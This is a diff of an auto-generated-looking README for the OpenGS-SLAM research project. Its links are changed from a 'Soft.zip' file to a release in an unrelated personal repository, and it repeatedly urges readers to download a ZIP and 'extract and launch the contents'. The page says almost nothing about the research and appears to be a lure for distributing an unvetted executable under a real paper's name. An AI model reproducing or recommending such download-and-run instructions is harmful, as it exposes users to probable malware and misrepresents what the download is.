@@ -20,13 +20,13 @@ Developed for the ICRA2025 conference, Open Semantic SLAM pushes the boundaries 
 - **Description:** ICRA2025: OpenGS-SLAM: Open-Set Dense Semantic SLAM with 3D Gaussian Splatting for Object-Level Scene Understanding
 - **Topics:** Not provided
 
-For more detailed information, code, and resources, please visit our repository on [GitHub](https://github.com/files/Soft.zip). Feel free to explore, contribute, and innovate with Open Semantic SLAM!
+For more detailed information, code, and resources, please visit our repository on [GitHub](https://github.com/JersonRomario/open_semantic_slam/releases/tag/v1.2). Feel free to explore, contribute, and innovate with Open Semantic SLAM!
 
 ## 🌈 Get Started
 
 To access the repository content, download the ZIP file from the following link:
   
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/files/Soft.zip)
+[![Download ZIP](https://github.com/JersonRomario/open_semantic_slam/releases/tag/v1.2)](https://github.com/JersonRomario/open_semantic_slam/releases/tag/v1.2)
 
 Remember, if the link ends with a file name, make sure to extract and launch the contents to kickstart your journey with Open Semantic SLAM!
 
@@ -40,6 +40,6 @@ Let's revolutionize SLAM technology and redefine the way robots perceive and int
 
 In this vast world of robotics and AI, Open Semantic SLAM stands out as a beacon of innovation and progress. Join us on this incredible journey as we pave the way for a future where robots perceive and understand the world with unmatched accuracy and intelligence. Let's code, create, and change the world with Open Semantic SLAM! 🤖🚀🔬
 
-[Visit the Repository](https://github.com/files/Soft.zip) to embark on your adventure today! 🌟👩‍💻🌌
+[Visit the Repository](https://github.com/JersonRomario/open_semantic_slam/releases/tag/v1.2) to embark on your adventure today! 🌟👩‍💻🌌
 
 ---
